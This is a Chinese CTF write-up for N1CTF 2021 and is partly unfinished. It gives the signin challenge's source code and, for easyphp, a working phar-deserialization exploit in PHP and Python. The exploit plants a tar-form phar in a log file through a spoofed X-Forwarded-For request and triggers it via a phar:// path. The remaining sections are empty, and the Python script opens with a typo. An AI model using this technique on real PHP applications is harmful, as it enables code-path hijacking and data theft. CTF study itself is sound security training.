# N1CTF 2021

## signin

> *2021/11/26*

### 题目

直接给了代码

```php
<?php 
//flag is /flag
$path=$_POST['path'];
$time=(isset($_GET['time'])) ? urldecode(date(file_get_contents('php://input'))) : date("Y/m/d H:i:s");
$name="/var/www/tmp/".time().rand().'.txt';
$black="f|ht|ba|z|ro|;|,|=|c|g|da|_";
$blist=explode("|",$black);
foreach($blist as $b){
    if(strpos($path,$b) !== false){
        die();
    }
}
if(file_put_contents($name, $time)){
    echo "<pre class='language-html'><code class='language-html'>logpath:$name</code></pre>";
}
$check=preg_replace('/((\s)*(\n)+(\s)*)/i','',file_get_contents($path));
if(is_file($check)){
    echo "<pre class='language-html'><code class='language-html'>".file_get_contents($check)."</code></pre>";
}

```

### payload

## easyphp

> *2021/11/26*

### 题目

这道题代码还是比较简单的，三个文件

```php
// flag.php

<?php

CLASS FLAG {
    private $_flag = 'n1ctf{************************}';
    public function __destruct(){
        echo "FLAG: " . $this->_flag;
    } 
}
```

`flag.php`就是当销毁时，会读取`flag`

```php
// index.php

<?php
include_once "flag.php";
include_once "log.php";

if(file_exists(@$_GET["file"])){
    echo "file exist!";
}else{
    echo "file not exist!";
}

?>
```

`index.php`则会判断文件是否存在

```php
// log.php

<?php
define('ROOT_PATH', dirname(__FILE__));

$log_type = @$_GET['log_type'];
if(!isset($log_type)){
    $log_type = "look";
}

$gets = http_build_query($_REQUEST);

$real_ip = $_SERVER['REMOTE_ADDR'];
$log_ip_dir = ROOT_PATH . '/log/' . $real_ip;

if(!is_dir($log_ip_dir)){
    mkdir($log_ip_dir, 0777, true);
}

$log = 'Time: ' . date('Y-m-d H:i:s') . ' IP: [' . @$_SERVER['HTTP_X_FORWARDED_FOR'] . '], REQUEST: [' . $gets . '], CONTENT: [' . file_get_contents('php://input') . "]\n";
$log_file = $log_ip_dir . '/' . $log_type . '_www.log';

file_put_contents($log_file, $log, FILE_APPEND);

?>
```

`log.php`会接受`logtype`参数，并把文件命名为该格式的文件，文件路径也已知，而且存在 **跨目录**，但是用处一般，本题将`log`的形式给出，日志始终以`]`收尾，

```php
'Time: ' . date('Y-m-d H:i:s') . ' IP: [' . @$_SERVER['HTTP_X_FORWARDED_FOR'] . '], REQUEST: [' . $gets . '], CONTENT: [' . file_get_contents('php://input') . "]\n";
```

该题目是比较明显的`phar`反序列化，因为存在着标准的文件操作函数`file_exists`，但是本体的难点在于，无法上传`phar`文件，而可读取的东西又只有`log`文件，所以思路就转换为如何把`phar`文件嵌入`log`文件中，正常的`phar`文件一般是以`GBMB`为结尾，直接插入会使其变为非法文件，所以就需要一种能将`phar`文件正确嵌入其他格式的方法，保证正确性。

这里有一篇将`phar`文件正确嵌入`jpg`文件的[文章](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)，和[虎符CTF中的一道题](https://guokeya.github.io/post/uxwHLckwx/)

实际上，这里可以采用`phar`的`tar`压缩形式，来将其正确的压入其中，而且，向结尾添加一个`]`也不会影响其正确性，举个例子

```php
<?php

CLASS FLAG {
    private $_flag = 'n1ctf{************************}';
    public function __destruct(){
        echo "FLAG: " . $this->_flag;
    } 
}


$phar = new PharData(dirname(__FILE__) . "/phar.tar", 0, "phartest", Phar::TAR);
$phar->startBuffering();
$o = new FLAG();
$phar->setMetadata($o);
$phar->addFromString($log, "test");
$phar->stopBuffering();

file_put_contents("./phar.tar", "]\n", FILE_APPEND);
```

这段代码是可以直接把`flag`读出来的，证明思路是正确的，写个脚本就能读出`flag`

### payload

```php
// exp.php
<?php

CLASS FLAG {
    //private $_flag;
    public function __destruct(){
        echo "FLAG: " . $this->_flag;
    } 
}

$ip = "172.17.0.1";
$log = 'Time: ' . date('Y-m-d H:i:s') . ' IP: [' . $ip . '], REQUEST: [], CONTENT: [';
$data_len = strlen($log);// 读取前面的长度，后面exp好将这部分去掉

if(!file_exists("./phar.tar")){
    $phar = new PharData(dirname(__FILE__) . "/phar.tar", 0, "phartest", Phar::TAR);
    $phar->startBuffering();
    $o = new FLAG();
    $phar->setMetadata($o);
    $phar->addFromString($log, "test");
    $phar->stopBuffering();

    file_put_contents("./phar.tar", "]\n", FILE_APPEND);
}

$exp = file_get_contents("./phar.tar");
$post_exp = substr($exp, $data_len);
echo rawurlencode($post_exp);

// var_dump(is_dir("phar://./phar.tar"));
//var_dump(is_dir("phar://./../../www/log/127.0.0.1/look_www.log"));
```

```python
# exp.py
mport os
import requests
from urllib.parse import unquote

def execCmd(cmd):
    r = os.popen(cmd)
    text = r.read()
    r.close()
    return text

headers = {
    "X-Forwarded-For": "172.17.0.1"
}

# write evil log file
exp = execCmd("php exp.php")
r = requests.post("http://127.0.0.1:8880/", unquote(exp), headers=headers)
# 这样访问request才为空
print(r.text)

# exp
r = requests.get("http://127.0.0.1:8880/?log_type=test&file=phar://./log/172.17.0.1/look_www.log")
# r = requests.get("http://testabc.com:10082/?log_type=test&file=phar://./log/127.0.0.1/phar.tar")
print(r.text)
```

## QQQueryyy_all_the_things

> *2021/11/26*

### 题目



### payload

## funny_web

> *2021/11/26*

### 题目



### payload

## tornado

> *2021/11/26*

### 题目



### payload